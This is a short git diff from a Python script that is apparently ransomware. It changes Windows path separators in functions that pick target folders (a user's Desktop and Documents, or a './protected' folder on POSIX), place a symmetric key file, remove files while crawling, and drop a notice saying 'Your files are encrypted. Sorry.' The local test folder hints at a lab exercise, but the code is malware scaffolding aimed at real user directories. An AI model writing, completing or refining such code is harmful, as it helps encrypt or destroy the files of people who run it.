@@ -54,7 +54,7 @@ def crawl(basedir):
             remove_file(filepath)
 
 def get_symkey_filepath():
-    keyfilepath = "./protected/sym.key" if os.name == "posix" else f"C:\\Users\\{os.getlogin()}\\Desktop\\sym.key" 
+    keyfilepath = "./protected/sym.key" if os.name == "posix" else f"C:/Users/{os.getlogin()}/Desktop/sym.key" 
     return keyfilepath
 
 def create_enc_key():
@@ -68,16 +68,16 @@ def get_target_directories():
     if current_os == "posix":
         return ["./protected"]
     else:
-        base_dir = f"C:\\Users\\{current_user}"
+        base_dir = f"C:/Users/{current_user}"
         directories = []
-        subdirs = ["\\Desktop", "\\Documents"]
+        subdirs = ["/Desktop", "/Documents"]
         for subdir in subdirs:
             directories.append(base_dir + subdir) 
         return directories
 
 def drop_notice():
     notice = "Your files are encrypted.\nSorry.\n:(\n"
-    filepath = "./protected/notice.txt" if os.name == "posix" else f"C:\\Users\\{os.getlogin()}\\Desktop\\notice.txt" 
+    filepath = "./protected/notice.txt" if os.name == "posix" else f"C:/Users/{os.getlogin()}/Desktop/notice.txt" 
     encrypted_file = open(filepath, "w")
     encrypted_file.write(notice)
     encrypted_file.close()
